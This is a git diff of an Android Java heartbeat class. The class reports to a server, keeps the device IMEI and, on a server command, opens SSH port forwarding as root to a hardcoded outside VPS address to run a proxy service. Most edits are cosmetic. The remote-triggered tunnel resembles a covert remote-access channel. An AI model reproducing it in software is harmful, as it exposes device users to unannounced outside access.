@@ -30,7 +30,7 @@ import java.util.Random;
  */
 public class HeartBeatRunnable implements Runnable {
 
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = false;
 	private static final String TAG = "heartBeatRunnable";
 	public static boolean isSSHConnected = false;
 	public static final String url = "http://172.16.5.29:8000/heartbeat/";
@@ -39,10 +39,9 @@ public class HeartBeatRunnable implements Runnable {
 	public static String imei;
 	private Loader_Base_ForCommon<HeartBeatJson> mLoader;
 	private Context mContext;
-	private boolean isStartSSHBuild = false;
+	public static boolean isStartSSHBuild = false;
 	private String printMessage = null;
 	private Object mSync = new Object();
-
 
 	public HeartBeatRunnable(Context context) {
 		this.mContext = context;
@@ -95,8 +94,8 @@ public class HeartBeatRunnable implements Runnable {
 	private void initDebug() {
 		HeartBeatJson json = new HeartBeatJson();
 		HeartBeatInfo info = new HeartBeatInfo();
-		int sourcePort = new Random().nextInt(8000)+40000;
-		info.setPort("root@103.27.79.138:"+String.valueOf(sourcePort));
+		int sourcePort = new Random().nextInt(8000) + 40000;
+		info.setPort("root@103.27.79.138:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
 			if (mCurrentCount > 3 && !isStartSSHBuild) {
 				info.setStatusType(HeartBeatInfo.TYPE_START_SSH);
@@ -170,7 +169,6 @@ public class HeartBeatRunnable implements Runnable {
 							if (manager != null) {
 								manager.disconnectAll(true, false);
 							}
-							HeartBeatService.getInstance().cancelScheduledTasks();
 						} catch (Exception e) {
 							if (DEBUG) {
 								Log.d(TAG, e.fillInStackTrace().toString());
@@ -196,12 +194,13 @@ public class HeartBeatRunnable implements Runnable {
 			ProxyServiceUtil.getInstance(mContext).setHostBean(uri);
 			int startIndex = quickConnectString.indexOf(":");
 			String sourcePort = quickConnectString.substring(startIndex + 1);
+			//int sourcePort = new Random().nextInt(8000) + 40000;
 			Log.d(TAG, "vps分配到的host本地端口是:" + sourcePort);
-			ProxyServiceUtil.getInstance(mContext).setPortFowardBean(mContext, sourcePort);
+			ProxyServiceUtil.getInstance(mContext).setPortFowardBean(mContext, String.valueOf(sourcePort));
 
 			//开始启动服务
 			PortForwardBean bean = ProxyServiceUtil.getInstance(mContext).getPortFowardBean();
-			if (bean != null && !TextUtils.isEmpty(bean.getDescription())) {
+			if (bean != null && !TextUtils.isEmpty(bean.getDescription()) && !TextUtils.isEmpty(bean.getDestAddr())) {
 				EventBus.getDefault().post(new BindServiceEvent());
 			}
 		} else {
